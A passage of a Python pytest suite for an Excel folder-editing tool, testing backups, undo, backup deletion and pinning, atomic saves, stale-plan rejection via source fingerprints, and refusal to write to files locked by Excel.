    manifest_path = directory / "manifest.json"
    manifest = json.loads(manifest_path.read_text("utf-8"))
    manifest["status"] = "restored"
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
    folder_workbooks_module._sessions[catalog.sessionId].undo_stack.clear()
    monkeypatch.setattr(
        folder_workbooks_module,
        "_tree_has_reparse_point",
        lambda candidate: candidate == directory,
    )

    cleaned = cleanup_folder_backups(catalog.sessionId)

    assert cleaned.deletedExecutions == 0
    assert cleaned.failures
    assert directory.exists()


def test_delete_active_backup_discards_undo_after_disk_delete(tmp_path: Path) -> None:
    source, catalog, result = _execute_score_write_backup(tmp_path)
    undo_id = result.undo.undoId
    backup_root = tmp_path / ".excel-bro-backups"
    directory = backup_root / "executions" / undo_id
    reopened = scan_folder(tmp_path)
    management_token = list_folder_backups(
        reopened.sessionId
    ).backupManagementToken
    assert management_token is not None

    deleted = delete_folder_backup(
        management_token,
        undo_id,
        confirmed=True,
    )

    assert deleted.deletedUndoId == undo_id
    assert deleted.discardedUndo is True
    assert deleted.filesDeleted == 1
    assert deleted.bytesFreed > 0
    assert deleted.remainingUndoCount == 0
    assert not directory.exists()
    assert not backup_root.exists()
    changed = load_workbook(source, data_only=True)
    assert changed["得分"]["B2"].value == 35
    changed.close()
    with pytest.raises(ValueError, match="撤销数据已失效"):
        undo_folder_execution(
            FolderUndoRequest(
                sessionId=catalog.sessionId,
                undoId=undo_id,
            )
        )


def test_delete_backup_cleanup_failure_does_not_leave_false_undo(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _source, catalog, result = _execute_score_write_backup(tmp_path)
    undo_id = result.undo.undoId
    directory = tmp_path / ".excel-bro-backups" / "executions" / undo_id
    management_token = list_folder_backups(catalog.sessionId).backupManagementToken
    assert management_token is not None

    def fail_delete(candidate: Path) -> None:
        assert candidate.name == undo_id
        assert ".trash" in candidate.parts
        raise PermissionError("文件正在使用")

    monkeypatch.setattr(folder_workbooks_module.shutil, "rmtree", fail_delete)

    deleted = delete_folder_backup(management_token, undo_id, confirmed=True)

    assert deleted.cleanupPending is True
    assert deleted.bytesFreed == 0
    assert deleted.cleanupWarnings
    assert not directory.exists()
    assert not any(
        record.undo_id == undo_id
        for record in folder_workbooks_module._sessions[catalog.sessionId].undo_stack
    )
    assert list_folder_backups(catalog.sessionId).backups == []
    staged = list((tmp_path / ".excel-bro-backups" / ".trash").rglob(undo_id))
    assert len(staged) == 1
    assert staged[0].is_dir()


def test_delete_backup_requires_explicit_confirmation(tmp_path: Path) -> None:
    _source, catalog, result = _execute_score_write_backup(tmp_path)
    undo_id = result.undo.undoId
    directory = tmp_path / ".excel-bro-backups" / "executions" / undo_id
    management_token = list_folder_backups(catalog.sessionId).backupManagementToken
    assert management_token is not None

    with pytest.raises(ValueError, match="必须明确确认"):
        delete_folder_backup(management_token, undo_id, confirmed=False)

    assert directory.exists()
    assert list_folder_backups(catalog.sessionId).backups[0].canUndo is True


def test_delete_backup_rejects_stale_revision_before_moving_files(
    tmp_path: Path,
) -> None:
    _source, catalog, result = _execute_score_write_backup(tmp_path)
    assert result.undo is not None
    listed = list_folder_backups(catalog.sessionId)
    management_token = listed.backupManagementToken
    assert management_token is not None
    initial = listed.backups[0]
    set_folder_backup_pinned(management_token, result.undo.undoId, pinned=True)

    with pytest.raises(ValueError, match="状态已变化"):
        delete_folder_backup(
            management_token,
            result.undo.undoId,
            confirmed=True,
            expected_revision=initial.revision,
            expected_invalidated_undo_ids=initial.deleteInvalidatesUndoIds,
        )

    directory = (
        tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
    )
    assert directory.exists()
    assert list_folder_backups(catalog.sessionId).backups[0].canUndo is True


def test_backup_can_be_marked_for_long_term_retention(tmp_path: Path) -> None:
    _source, catalog, result = _execute_score_write_backup(tmp_path)
    management_token = list_folder_backups(catalog.sessionId).backupManagementToken
    assert management_token is not None

    pinned = set_folder_backup_pinned(
        management_token, result.undo.undoId, pinned=True
    )
    listed = list_folder_backups(catalog.sessionId).backups[0]

    assert pinned.pinned is True
    assert listed.pinned is True
    assert "用户已保留" in listed.protectedReasons

    unpinned = set_folder_backup_pinned(
        management_token, result.undo.undoId, pinned=False
    )
    assert unpinned.pinned is False
    assert list_folder_backups(catalog.sessionId).backups[0].pinned is False


def test_delete_middle_backup_invalidates_only_dependent_older_undo(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    results = []
    for index, value in enumerate((35, 36, 37)):
        snapshot = create_folder_snapshot(
            FolderSnapshotRequest(
                sessionId=catalog.sessionId,
                selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
            )
        )
        plan = AnalysisPlan.model_validate(
            {
                "id": f"dependency-{index}",
                "title": f"依赖写入 {index + 1}",
                "summary": "验证删除中间恢复点的依赖影响",
                "actions": [
                    {
                        "type": "writeValues",
                        "sheet": snapshot.worksheets[0].name,
                        "range": "B2",
                        "values": [[value]],
                    }
                ],
            }
        )
        results.append(
            execute_folder_plan(
                FolderExecuteRequest(
                    sessionId=catalog.sessionId,
                    plan=_stamp_plan(plan, snapshot),
                )
            )
        )

    first_id, middle_id, latest_id = [result.undo.undoId for result in results]
    management_token = list_folder_backups(catalog.sessionId).backupManagementToken
    assert management_token is not None

    deleted = delete_folder_backup(management_token, middle_id, confirmed=True)

    assert deleted.invalidatedUndoIds == [first_id]
    assert deleted.remainingUndoIds == [latest_id]
    listed = {entry.undoId: entry for entry in list_folder_backups(catalog.sessionId).backups}
    assert listed[first_id].canUndo is False
    assert middle_id not in listed
    assert listed[latest_id].canUndo is True


def test_failed_verification_still_allows_folder_execution_undo(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    original_bytes = source.read_bytes()
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "failed-verification-undo",
            "title": "写入后验收失败",
            "summary": "写入发生后仍保留撤销入口",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": target,
                    "range": "B2",
                    "values": [[35]],
                }
            ],
            "acceptanceCriteria": [
                {
                    "type": "rangeEquals",
                    "sheet": target,
                    "range": "B2",
                    "expected": [[999]],
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    assert result.verification.status == "failed"
    assert result.undo is not None
    backup_directory = (
        tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
    )
    assert backup_directory.exists()
    changed = load_workbook(source, data_only=True)
    assert changed["得分"]["B2"].value == 35
    changed.close()

    undone = undo_folder_execution(
        FolderUndoRequest(
            sessionId=result.undo.sessionId,
            undoId=result.undo.undoId,
        )
    )

    assert undone.filesRestored == ["scores.xlsx"]
    assert undone.executionsUndone == 1
    assert source.read_bytes() == original_bytes
    assert backup_directory.exists()
    restored_manifest = json.loads(
        (backup_directory / "manifest.json").read_text("utf-8")
    )
    assert restored_manifest["status"] == "restored"
    operations = tmp_path / ".excel-bro-backups" / "operations"
    assert not operations.exists() or not any(operations.iterdir())


def test_folder_undo_keeps_central_rescue_copies_when_rollback_fails(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    for region in ("华南", "华北"):
        directory = tmp_path / region
        directory.mkdir()
        _create_source(directory / "报表.xlsx")
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=file.id, sheets=["得分"])
                for file in catalog.files
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "undo-central-rescue",
            "title": "多文件撤销故障",
            "summary": "验证撤销失败时救援副本集中保留",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": sheet.name,
                    "range": "B2",
                    "values": [[50 + index]],
                }
                for index, sheet in enumerate(snapshot.worksheets)
            ],
        }
    )
    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )
    assert result.undo is not None

    original_replace = Path.replace
    replace_count = 0

    def fail_second_restore(temporary: Path, target: Path):
        nonlocal replace_count
        if ".excel-bro-undo-" in temporary.name:
            replace_count += 1
            if replace_count == 2:
                raise PermissionError("第二个文件无法替换")
        return original_replace(temporary, target)

    original_copy2 = folder_workbooks_module.shutil.copy2

    def fail_rescue_rollback(source_path: Path, target_path: Path, *args, **kwargs):
        source = Path(source_path)
        if "operations" in source.parts and "rollback" in source.parts:
            raise PermissionError("第一个文件无法回滚")
        return original_copy2(source_path, target_path, *args, **kwargs)

    monkeypatch.setattr(Path, "replace", fail_second_restore)
    monkeypatch.setattr(folder_workbooks_module.shutil, "copy2", fail_rescue_rollback)

    with pytest.raises(RuntimeError, match="统一备份目录"):
        undo_folder_execution(
            FolderUndoRequest(
                sessionId=result.undo.sessionId, undoId=result.undo.undoId
            )
        )

    assert not list(tmp_path.rglob("*.excel-bro-undo-*.xlsx"))
    operation_directories = list(
        (tmp_path / ".excel-bro-backups" / "operations").iterdir()
    )
    assert len(operation_directories) == 1
    operation_manifest = json.loads(
        (operation_directories[0] / "manifest.json").read_text("utf-8")
    )
    assert operation_manifest["status"] == "needs_attention"
    assert any(
        item["state"] == "unknown" for item in operation_manifest["files"]
    )
    assert len(list((operation_directories[0] / "rollback").rglob("*.xlsx"))) == 2
    listed = list_folder_backups(catalog.sessionId)
    assert listed.backups[0].status == "needs_attention"
    assert listed.storageSummary is not None
    assert listed.storageSummary.pendingCleanupBytes > 0
    exported = export_folder_backup(
        catalog.sessionId,
        result.undo.undoId,
        operation_id="export-undo-rescue",
    )
    assert exported.complete is True
    assert len(exported.files) == 2


def test_folder_undo_removes_a_new_output_file(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    plan = AnalysisPlan.model_validate(
        {
            "id": "undo-new-output",
            "title": "生成后撤销",
            "summary": "撤销本次新建的结果文件",
            "actions": [
                {"type": "createWorksheet", "sheet": "汇总"},
                {
                    "type": "writeValues",
                    "sheet": "汇总",
                    "range": "A1",
                    "values": [["结果"]],
                },
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(sessionId=catalog.sessionId, plan=plan)
    )

    output = tmp_path / OUTPUT_FILE_NAME
    assert output.exists()
    assert result.undo is not None

    undo_folder_execution(
        FolderUndoRequest(
            sessionId=result.undo.sessionId,
            undoId=result.undo.undoId,
        )
    )

    assert not output.exists()


def test_folder_undo_refuses_to_overwrite_changes_made_after_execution(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "undo-change-protection",
            "title": "安全撤销",
            "summary": "不覆盖执行后的人工编辑",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": target,
                    "range": "B2",
                    "values": [[35]],
                }
            ],
        }
    )
    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )
    assert result.undo is not None

    changed = load_workbook(source)
    changed["得分"]["B2"] = 77
    changed.save(source)
    changed.close()

    with pytest.raises(ValueError, match="执行后文件又发生了变化"):
        undo_folder_execution(
            FolderUndoRequest(
                sessionId=result.undo.sessionId,
                undoId=result.undo.undoId,
            )
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 77
    unchanged.close()


def test_folder_undo_cascades_newer_executions_in_the_same_session(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    original_bytes = source.read_bytes()
    catalog = scan_folder(tmp_path)

    def execute_value(plan_id: str, value: int):
        snapshot = create_folder_snapshot(
            FolderSnapshotRequest(
                sessionId=catalog.sessionId,
                selections=[
                    FolderSelection(
                        fileId=catalog.files[0].id, sheets=["得分"]
                    )
                ],
            )
        )
        plan = AnalysisPlan.model_validate(
            {
                "id": plan_id,
                "title": plan_id,
                "summary": "连续修改同一文件",
                "actions": [
                    {
                        "type": "writeValues",
                        "sheet": snapshot.worksheets[0].name,
                        "range": "B2",
                        "values": [[value]],
                    }
                ],
            }
        )
        return execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId,
                plan=_stamp_plan(plan, snapshot),
            )
        )

    first = execute_value("first-folder-write", 35)
    second = execute_value("second-folder-write", 40)
    assert first.undo is not None
    assert second.undo is not None

    undone = undo_folder_execution(
        FolderUndoRequest(
            sessionId=first.undo.sessionId,
            undoId=first.undo.undoId,
        )
    )

    assert undone.executionsUndone == 2
    assert undone.remainingUndoCount == 0
    assert source.read_bytes() == original_bytes


def test_folder_undo_stack_eviction_keeps_the_oldest_managed_backup_as_history(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    directories: list[Path] = []

    for index in range(6):
        snapshot = create_folder_snapshot(
            FolderSnapshotRequest(
                sessionId=catalog.sessionId,
                selections=[
                    FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
                ],
            )
        )
        plan = AnalysisPlan.model_validate(
            {
                "id": f"eviction-{index}",
                "title": f"第 {index + 1} 次修改",
                    "summary": "验证快速撤销资格与物理备份保留分离",
                "actions": [
                    {
                        "type": "writeValues",
                        "sheet": snapshot.worksheets[0].name,
                        "range": "B2",
                        "values": [[40 + index]],
                    }
                ],
            }
        )
        result = execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId,
                plan=_stamp_plan(plan, snapshot),
            )
        )
        assert result.undo is not None
        directories.append(
            tmp_path
            / ".excel-bro-backups"
            / "executions"
            / result.undo.undoId
        )

    assert all(directory.exists() for directory in directories)
    listed = list_folder_backups(catalog.sessionId).backups
    assert len(listed) == 6
    by_id = {entry.undoId: entry for entry in listed}
    assert by_id[directories[0].name].canUndo is False
    assert by_id[directories[0].name].undoAvailability == "view_only"
    assert all(by_id[directory.name].canUndo for directory in directories[1:])


def test_folder_save_failure_leaves_all_original_files_unchanged(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    original_bytes = source.read_bytes()
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "atomic-save",
            "title": "原子保存",
            "summary": "任一临时文件保存失败时不替换任何目标",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": target,
                    "range": "B2",
                    "values": [[99]],
                },
                {
                    "type": "writeValues",
                    "sheet": "汇总",
                    "range": "A1",
                    "values": [["结果"]],
                },
            ],
        }
    )
    original_save = Workbook.save
    save_count = 0

    def fail_second_save(self, filename) -> None:
        nonlocal save_count
        save_count += 1
        if save_count == 2:
            raise OSError("模拟第二个临时文件保存失败")
        original_save(self, filename)

    monkeypatch.setattr(Workbook, "save", fail_second_save)

    with pytest.raises(OSError, match="第二个临时文件保存失败"):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    assert source.read_bytes() == original_bytes
    assert not (tmp_path / "Excel Bro 结果.xlsx").exists()
    assert not list(tmp_path.glob("*.excel-bro-backup-*"))
    assert not list(tmp_path.glob(".*.excel-bro-tmp-*"))


def test_folder_execution_closes_workbooks_when_an_action_raises(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "close-on-action-error",
            "title": "动作失败释放文件",
            "summary": "图片解析失败时也要关闭工作簿",
            "actions": [
                {
                    "type": "addImage",
                    "sheet": snapshot.worksheets[0].name,
                    "base64": "@@@@",
                    "targetRange": "D1",
                }
            ],
        }
    )
    original_close = Workbook.close
    closed: list[Workbook] = []

    def track_close(self) -> None:
        closed.append(self)
        original_close(self)

    monkeypatch.setattr(Workbook, "close", track_close)

    with pytest.raises(ValueError, match="无法解析图片数据"):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId,
                plan=_stamp_plan(plan, snapshot),
            )
        )

    assert closed


def test_folder_execution_rejects_a_target_file_locked_by_another_process(
    tmp_path: Path,
) -> None:
    """目标文件正在 Excel 里打开时，必须在碰磁盘之前明确拒绝。

    os.replace() 会被 Windows 拒绝（WinError 5），原先这个失败发生在写完临时文件、
    做完备份之后，抛 RuntimeError 逃逸成 500——响应不带 CORS 头，前端只看到
    Failed to fetch。而且即使替换成功也不安全：Excel 的内存副本下次保存会把修改盖掉。
    """
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "locked-target",
            "title": "拒绝被占用的文件",
            "summary": "文件正在 Excel 中打开",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "F3",
                    "values": [[44]],
                }
            ],
        }
    )

    def deny_write(path: Path) -> bool:
        return path.name == "scores.xlsx"

    import server.app.folder_workbooks as module

    original = module._is_locked_for_writing
    module._is_locked_for_writing = deny_write
    try:
        # Selection/write preflight now rejects earlier. The access probe cannot
        # distinguish an external lock from missing write permission.
        with pytest.raises(ValueError, match="被占用或无写回权限"):
            execute_folder_plan(
                FolderExecuteRequest(
                    sessionId=catalog.sessionId,
                    plan=_stamp_plan(plan, snapshot),
                )
            )
    finally:
        module._is_locked_for_writing = original

    # 拒绝发生在任何写入之前：原文件没动，也没留下临时文件或备份。
    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["F3"].value is None
    unchanged.close()
    leftovers = [
        item.name
        for item in tmp_path.iterdir()
        if "excel-bro-tmp-" in item.name or "excel-bro-backup-" in item.name
    ]
    assert leftovers == []


def test_lock_probe_reports_a_writable_file_as_unlocked(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)

    import server.app.folder_workbooks as module

    assert module._is_locked_for_writing(source) is False
    # 不存在的文件不算被占用——新建输出文件要能通过。
    assert module._is_locked_for_writing(tmp_path / "还没有.xlsx") is False


@pytest.mark.skipif(
    not sys.platform.startswith("win"), reason="共享模式拒绝是 Windows 语义"
)
def test_lock_probe_detects_a_real_share_mode_lock(tmp_path: Path) -> None:
    """用真实的共享模式独占句柄验证探针，而不是只靠 monkeypatch。

    Excel 以「允许别人读、不允许别人写」的共享模式打开工作簿，这才是挡住
    os.replace() 的真正机制。注意字节范围锁（msvcrt.locking）不会阻止
    open("r+b")，所以不能用它来模拟——那样测试会假绿。
    """
    import ctypes
    from ctypes import wintypes

    import server.app.folder_workbooks as module

    source = tmp_path / "scores.xlsx"
    _create_source(source)
    assert module._is_locked_for_writing(source) is False

    create_file = ctypes.windll.kernel32.CreateFileW
    create_file.restype = wintypes.HANDLE
    handle = create_file(
        str(source),
        0x80000000 | 0x40000000,  # GENERIC_READ | GENERIC_WRITE
        0x1,  # FILE_SHARE_READ：不允许别人写
        None,
        3,  # OPEN_EXISTING
        0x80,  # FILE_ATTRIBUTE_NORMAL
        None,
    )
    assert handle not in (0, -1), "无法建立测试用的独占句柄"
    try:
        assert module._is_locked_for_writing(source) is True
    finally:
        ctypes.windll.kernel32.CloseHandle(handle)

    assert module._is_locked_for_writing(source) is False


def test_scan_folder_by_path_creates_a_new_session(tmp_path: Path) -> None:
    """按路径重扫得到独立的新会话，旧会话不受影响。"""
    source = tmp_path / "scores.xlsx"
    _create_source(source)

    first = scan_folder(tmp_path)
    second = scan_folder_by_path(str(tmp_path))

    assert second.sessionId != first.sessionId
    assert second.folderPath == str(tmp_path.resolve())
    # fileId 由相对路径派生，跨会话稳定——前端才能用旧 key 重放勾选。
    assert [file.id for file in second.files] == [file.id for file in first.files]
    for session_id in (first.sessionId, second.sessionId):
        snapshot = create_folder_snapshot(
            FolderSnapshotRequest(
                sessionId=session_id,
                selections=[
                    FolderSelection(fileId=second.files[0].id, sheets=["得分"])
                ],
            )
        )
        assert snapshot.worksheets[0].dataRows[0] == ["嘟嘟嘟", 33]


def test_scan_folder_by_path_rejects_a_missing_directory(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="文件夹不存在"):
        scan_folder_by_path(str(tmp_path / "并不存在的目录"))


def test_scan_folder_by_path_rejects_a_file_path(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)

    with pytest.raises(ValueError, match="路径不是文件夹"):
        scan_folder_by_path(str(source))


def test_rebuilt_session_still_rejects_a_plan_whose_source_changed(
    tmp_path: Path,
) -> None:
    """重建会话不能掩盖「数据已变」。

    前端在后端重启后会静默重建会话（重扫路径 + 重放勾选）。如果宕机期间源文件被
    改过，重建出的新快照指纹与旧计划里的指纹不一致，执行必须照旧被拒——否则用户会
    拿着按旧数据生成的计划去改新数据。这条测试锁住这个边界。
    """
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    file_id = catalog.files[0].id
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=file_id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "rebuilt-stale",
            "title": "重建后仍拒绝过期计划",
            "summary": "会话重建不等于数据没变",
            "sourceFingerprint": snapshot.sourceFingerprint,
            "sourceFingerprintSheets": snapshot.sourceFingerprintSheets,
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[35]],
                }
            ],
        }
    )

    # 模拟后端重启期间源文件被改动。
    changed = load_workbook(source)
    changed["得分"]["B2"] = 99
    changed.save(source)
    changed.close()

    # 前端重建：重扫路径 + 用稳定的 fileId 重放勾选。
    rebuilt = scan_folder_by_path(str(tmp_path))
    rebuilt_snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=rebuilt.sessionId,
            selections=[FolderSelection(fileId=file_id, sheets=["得分"])],
        )
    )
    assert rebuilt_snapshot.sourceFingerprint != snapshot.sourceFingerprint

    # 拦在 _execute_folder_plan 的指纹比对上，任何写入之前。
    with pytest.raises(ValueError, match="来源指纹已失效"):
        execute_folder_plan(
            FolderExecuteRequest(sessionId=rebuilt.sessionId, plan=plan)
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 99
    unchanged.close()


def test_folder_snapshot_rejects_changes_during_read_without_publishing_authorization(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    original_load = folder_workbooks_module.load_workbook

    def load_then_change_on_close(path, **options):
        workbook = original_load(path, **options)
        if Path(path) == source and options.get("read_only"):
            original_close = workbook.close

            def close_and_change():
                original_close()
                changed = original_load(source)
                changed["得分"]["B2"] = 99
                changed.save(source)
                changed.close()

            workbook.close = close_and_change
        return workbook

    monkeypatch.setattr(folder_workbooks_module, "load_workbook", load_then_change_on_close)
    with pytest.raises(ValueError, match="读取.*发生变化"):
        create_folder_snapshot(FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
        ))
    session = folder_workbooks_module._session(catalog.sessionId)
    assert session.selected_targets == {}
    assert session.selected_sources == {}
    assert session.source_fingerprint is None
    unchanged = original_load(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 99
    unchanged.close()


def test_failed_folder_snapshot_preserves_previous_authorized_scope(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    request = FolderSnapshotRequest(
        sessionId=catalog.sessionId,
        selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
    )
    baseline = create_folder_snapshot(request)
    session = folder_workbooks_module._session(catalog.sessionId)
    old_targets, old_sources = dict(session.selected_targets), dict(session.selected_sources)
    fingerprint = folder_workbooks_module._selected_files_fingerprint
    checks = 0

    def fingerprint_then_change(paths):
        nonlocal checks
        checks += 1
        result = fingerprint(paths)
        if checks == 1:
            changed = load_workbook(source)
            changed["得分"]["B2"] = 99
            changed.save(source)
            changed.close()
        return result

    monkeypatch.setattr(folder_workbooks_module, "_selected_files_fingerprint", fingerprint_then_change)
    with pytest.raises(ValueError, match="读取.*发生变化"):
        create_folder_snapshot(FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["说明"])],
        ))
    assert session.selected_targets == old_targets
    assert session.selected_sources == old_sources
    assert session.source_fingerprint == baseline.sourceFingerprint


def test_folder_execution_rejects_files_changed_after_preview(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    changed = load_workbook(source)
    changed["得分"]["B2"] = 99
    changed.save(source)
    changed.close()
    plan = AnalysisPlan.model_validate(
        {
            "id": "stale-preview",
            "title": "拒绝过期预览",
            "summary": "文件变化后不能执行旧计划",
            "sourceFingerprint": snapshot.sourceFingerprint,
            "sourceFingerprintSheets": snapshot.sourceFingerprintSheets,
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[35]],
                }
            ],
        }
    )

    with pytest.raises(ValueError, match="发生变化"):
        execute_folder_plan(
            FolderExecuteRequest(sessionId=catalog.sessionId, plan=plan)
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 99
    unchanged.close()


def test_folder_execution_rejects_a_plan_without_preview_fingerprint(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "missing-fingerprint",
            "title": "缺少来源指纹",
            "summary": "不能绕过预览新鲜度检查",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[99]],
                }
            ],
        }
    )

    with pytest.raises(ValueError, match="缺少数据来源指纹"):
        execute_folder_plan(
            FolderExecuteRequest(sessionId=catalog.sessionId, plan=plan)
        )


def test_plan_cannot_modify_an_unselected_sheet(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "unselected-edit",
            "title": "越权修改",
            "summary": "不应执行",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": "scores.xlsx › 说明",
                    "range": "A1",
                    "values": [["不允许"]],
                }
            ],
        }
    )

    with pytest.raises(ValueError, match="未选择"):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )


@pytest.mark.parametrize(
    ("action_type", "action"),
    [
        (
            "clearRange",
            {
                "type": "clearRange",
                "sheet": "TARGET",
                "range": "A1:B3",
                "applyTo": "contents",
                "filters": [
                    {"field": "得分", "operator": "greaterThan", "value": 40}
                ],
            },
        ),
        (
            "copyRange",
            {
                "type": "copyRange",
                "sheet": "TARGET",
                "sourceSheet": "TARGET",
                "sourceRange": "A1:B3",
                "targetRange": "D1:E3",
                "copyType": "values",
                "filters": [
                    {"field": "得分", "operator": "greaterThan", "value": 40}
                ],
            },
        ),
    ],
)
def test_folder_preflight_rejects_filtered_write_actions(
    tmp_path: Path, action_type: str, action: dict[str, object]
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    action["sheet"] = target
    if action_type == "copyRange":
        action["sourceSheet"] = target
    plan = AnalysisPlan.model_validate(
        {
            "id": f"reject-filtered-{action_type}",
